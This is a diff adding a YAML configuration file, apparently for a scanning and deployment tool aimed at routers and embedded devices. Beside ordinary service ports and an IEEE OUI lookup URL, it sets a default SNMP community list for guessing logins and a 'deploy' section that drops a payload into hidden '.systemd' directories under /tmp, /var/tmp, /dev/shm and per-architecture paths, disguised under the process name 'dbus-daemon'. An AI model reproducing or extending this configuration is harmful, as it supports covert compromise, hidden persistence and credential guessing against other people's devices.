@@ -1,0 +1,36 @@
+services:
+  ssh: 22
+  ftp: 21
+  http: 8080
+  https: 443
+  snmp: 161
+  ssdp: 1900
+  mdns: 5353
+
+deploy:
+  remote_path: "/tmp/.systemd"
+  fallback_paths:
+    - "/var/tmp/.systemd"
+    - "/dev/shm/.systemd"
+  mask_name: "dbus-daemon"
+  paths_by_arch:
+    arm: "/data/local/tmp/.systemd"
+    mips: "/var/run/.systemd"
+    default: "/tmp/.systemd"
+
+oui:
+  update_on_start: false
+  url: "https://standards-oui.ieee.org/oui/oui.txt"
+
+snmp:
+  default_communities:
+    - public
+    - private
+    - admin
+    - root
+    - cisco
+    - mikrotik
+
+rate_limiting:
+  default_rate: null
+  burst_capacity: 100
